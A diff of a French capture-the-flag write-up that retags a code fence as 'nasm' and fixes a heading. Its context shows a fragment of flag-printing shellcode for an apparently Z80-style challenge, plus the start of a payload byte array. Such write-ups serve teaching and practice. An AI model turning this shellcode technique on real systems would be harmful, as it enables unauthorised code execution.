@@ -274,7 +274,7 @@ L'idée générale est :
 
 Le shellcode permettant d'afficher le flag est le suivant : 
 
-```
+```nasm
 ; Push de l'adresse de flag
 11 FA 06 : LD DE, 0x06FA
 d5       : PUSH DE
@@ -303,7 +303,7 @@ payload = [0xBB, 0xC0, 0x11, 0xFA, 0x06, 0xD5, 0x21, 0x04,
 ```
 
 
-## Code finale
+## Code final
 
 Une fois notre payload construit, il ne reste plus qu'à interagir avec l'instance distante : 
 
